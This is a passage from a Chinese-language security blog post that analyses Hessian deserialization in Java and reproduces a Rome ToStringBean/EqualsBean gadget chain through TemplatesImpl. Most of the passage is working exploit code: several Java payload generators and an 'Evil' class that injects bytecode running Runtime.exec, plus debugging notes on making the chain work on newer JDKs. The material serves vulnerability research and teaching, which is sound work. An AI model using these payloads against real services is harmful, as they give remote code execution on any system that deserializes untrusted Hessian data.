+<figcaption aria-hidden="true">14</figcaption>
+</figure>
+<p>在readmap当中，先使用instantiate()初步实例化该对象，然后把该对象扔进readmap当中。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\15.png" alt="15">
+<figcaption aria-hidden="true">15</figcaption>
+</figure>
+<p>readmap里面事实上就是对序列化对象进行反序列化的一个具体的实现，里面调用了readobject对其进行反序列化。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\16.png" alt="16">
+<figcaption aria-hidden="true">16</figcaption>
+</figure>
+<p>第一次的反序列化这边会先读，[字段名类型]，这个类型决定后续处理的分支第一个拿到的字段名类型是S，也就是String。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\17.png" alt="17">
+<figcaption aria-hidden="true">17</figcaption>
+</figure>
+<p>如下是具体对于对应获取字段名的处理，通过后面的“分隔符”拿到对应字段名的长度，然后进行获取</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\18.png" alt="18">
+<figcaption aria-hidden="true">18</figcaption>
+</figure>
+<p>后面的对应字段名的值是使用deserialize来获取的，并放到object当中。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\19.png" alt="19">
+<figcaption aria-hidden="true">19</figcaption>
+</figure>
+<p>但是在这之前观察到一个反序列化调用的一个函数<code>this._fieldMap.get</code>，这个函数会调用hashmap的hash方法，这也许会成为我们的突破口。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\20.png" alt="20">
+<figcaption aria-hidden="true">20</figcaption>
+</figure>
+<h4 id="hessian反序列化利用">Hessian反序列化利用</h4>
+<h5 id="rome利用链非signedobejct">rome利用链——非signedobejct</h5>
+<p>在我们详细了解了Hessian的反序列化流程之后，我们引发了一个思考，这个Hessian并不是一个直接能够利用的类（该类并不存在着严格意义上的Gadgets），Hessian的作用在放序列化过程中仅仅是一个触发的作用。</p>
+<p>我们可以使用rome反序列化链进行攻击，添加rome依赖之后，我们可以得到下面的一个payload。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取字节码的字节流对象</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//装载Templates</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//防止序列化触发</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        FileOutputStream fileOutputStream = new FileOutputStream(&quot;./RomeHessian.bin&quot;);</span></span><br><span class="line"><span class="comment">//        HessianOutput hessianOutput = new HessianOutput(fileOutputStream);</span></span><br><span class="line"><span class="comment">//        hessianOutput.writeObject(hashMap);</span></span><br><span class="line"><span class="comment">//        hessianOutput.close();</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;./RomeHessian.bin&quot;);</span></span><br><span class="line"><span class="comment">//        HessianInput hessianInput = new HessianInput(fileInputStream);</span></span><br><span class="line"><span class="comment">//        HashMap o = (HashMap) hessianInput.readObject();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br></pre></td></tr></table></figure>
+<p>上述payload在触发的时候确实能够实现字节码的执行，但是由于序列化过程的存在我们无法分辨到底是哪一个步骤实现的命令执行，所以在注释的代码段当中有一段关于文件写入然后又通过文件读取的方式进行反序列化的代码段。事实证明这个代码段完全可以执行命令，上述利用链是rome的objectbean利用链，不是市面上广为使用的jdbc利用链。</p>
+<h6 id="问题所在">问题所在</h6>
+<p>事实上在复现利用链的时候出现过一个奇怪的问题，这才使得我不得不去使用文件读写的方式进行序列化以及反序列化。在原本的序列化与反序列化中我们可以使用“人畜无害”的普通值来代替恶意字节码的方式来实现序列化过程不触发命令执行。可是在这里却出现了一些问题</p>
+<p>第一次复现，实验环境为jdk8u20，payload能够成功弹出计算器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">//获取字节码的字节流对象</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line">    <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//装载Templates</span></span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">    setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//防止序列化触发</span></span><br><span class="line">    <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改成真正的payload</span></span><br><span class="line">    setFieldValue(toStringBean, <span class="string">&quot;_obj&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">    hessianOutput.writeObject(hashMap);</span><br><span class="line">    hessianOutput.close();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">    <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>恶意类的代码是统一的，如下所示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二次实验，实验环境为jdk8u281，payload没变，但是这一次并没有任何反应。这是一个奇怪的问题，照网上部分人的说法是因为TemplatesImpl当中存在着transient修饰的变量导致没有办法正常的反序列化。可这明显不能解释为什么命令执行不了，按理来说_tfactory不参与整个的反序列化流程，自然不会影响。</p>
+<p>所以开启调试，经过了多次调试之后，我索性把断点直接放在了TamplatesImpl当中的getOutputProperties。看看整个反序列化的流程到底有没有走到这里(序列化的时候先不打上这个断点，等程序运行到readobject的时候再打上这个断点)，结果就是程序确确实实的走到了这里，但是字节码却没有正常的执行。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\21.jpg" alt="21">
+<figcaption aria-hidden="true">21</figcaption>
+</figure>
+<p>奇怪的是在8u20的时候却可以完美运行，到8u281这里却无法运行了，其他的依赖版本全部一致。</p>
+<h6 id="问题分析">问题分析</h6>
+<p>最后测试情况如下：在8u20的情况下能够执行无害版本的payload，在8u281当中无法执行任何payload。</p>
+<p>Q:什么是有害版本的payload？</p>
+<p>A:没有做防止序列化触发处理的payload</p>
+<p>Q:什么是无害版本的payload？</p>
+<p>A:做了防止序列化触发处理的payload</p>
+<p>“有害”版本的payload如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeToStringBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass=classPool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取字节码的字节流对象</span></span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass clazz = classPool.get(Evil.class.getName());</span></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplates();</span><br><span class="line">        <span class="comment">//装载Templates</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//防止序列化触发</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        FileOutputStream fileOutputStream = new FileOutputStream(&quot;./RomeHessian.bin&quot;);</span></span><br><span class="line"><span class="comment">//        HessianOutput hessianOutput = new HessianOutput(fileOutputStream);</span></span><br><span class="line"><span class="comment">//        hessianOutput.writeObject(hashMap);</span></span><br><span class="line"><span class="comment">//        hessianOutput.close();</span></span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;./RomeHessian.bin&quot;);</span></span><br><span class="line"><span class="comment">//        HessianInput hessianInput = new HessianInput(fileInputStream);</span></span><br><span class="line"><span class="comment">//        HashMap o = (HashMap) hessianInput.readObject();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">student1</span> <span class="operator">=</span> hessianInput.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先说说为什么两者都不能触发有害版本的payload，经过了多次调试最终发现问题出现在ClassDeserializer当中的cretae上面，如下图所示</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\23.png" alt="23">
+<figcaption aria-hidden="true">23</figcaption>
+</figure>
+<p>这个create正在试图使用forname这种本地加载类的方法来加载Evil类，这显然不太现实因为在被攻击者的一方里面一定不会存在这一个恶意类，所以代码直接抛出了异常，随后结束了程序运行。（这里如果使用的是上述的payload，那么name就是Test）ClassDeserializer是属于hessian包里面的一个类，也就是说程序在当前的流程下还没有走出hessian反序列化的流程，但是他为什么会获得存在于二进制流里面的字节码对象呢？</p>
+<p>通过调用栈我们可以找到最一开始引发调用create方法的地方，最终追溯到了HessianInput的readObject方法上面</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\25.png" alt="25">
+<figcaption aria-hidden="true">25</figcaption>
+</figure>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\26.png" alt="26">
+<figcaption aria-hidden="true">26</figcaption>
+</figure>
+<p>当读到序列化数据的内容为M的时候，就会触发readmap，然后在readmap里面调用create方法，从之前的序列化分析上来看，Mt字段后面紧跟的是一个类，但是恶意类是以<code>byte[]</code>的形式存放在bytecode当中的所以应该是不会来到这里的，因此要看一下序列化生成的内容到底是什么样的，未能触发恶意代码的二进制文件截图如下，在最后的一行我们看到了Mt开头的数据，后面跟着一行有关Test类的数据</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\24.png" alt="24">
+<figcaption aria-hidden="true">24</figcaption>
+</figure>
+<p>从最后一行数据再往前看，我们还可以看到Test这个类其实隶属于_class这个field，那_class是什么时候被赋值的呢？TemplatesImpl#defineTransletClasses这个函数对_class属性进行了赋值，把bytecodes里面的内容都放进去了。</p>
+<figure>
+<img data-src="E:\JAVA安全\Hessian\image\27.png" alt="27">
+<figcaption aria-hidden="true">27</figcaption>
+</figure>
+<p>既然调用了这个函数才能将数据放进_class当中，那么就意味着在序列化之前有一个函数触发了这条链，造成了_class被赋值后面的序列化行为没有办法正常执行。正因如此才需要使用“无害化”处理，使用无害的payload不会涉及到前面代码put的问题。有没有办法也能把有害的payload也能够利用呢？答案是有的。用反射把_class的值再改回null，如下所示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeToStringBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">        ClassPool classPool=ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass=classPool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取字节码的字节流对象</span></span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass clazz = classPool.get(Evil.class.getName());</span></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplates();</span><br><span class="line">        <span class="comment">//装载Templates</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//防止序列化触发</span></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="comment">//        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);</span></span><br><span class="line"><span class="comment">//        hessianOutput.writeObject(hashMap);</span></span><br><span class="line"><span class="comment">//        hessianOutput.close();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./RomeHessian.bin&quot;</span>);</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(fileOutputStream);</span><br><span class="line">        hessianOutput.writeObject(hashMap);</span><br><span class="line">        hessianOutput.close();</span><br><span class="line"><span class="comment">//        FileInputStream fileInputStream = new FileInputStream(&quot;./RomeHessian.bin&quot;);</span></span><br><span class="line"><span class="comment">//        HessianInput hessianInput = new HessianInput(fileInputStream);</span></span><br><span class="line"><span class="comment">//        HashMap o = (HashMap) hessianInput.readObject();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 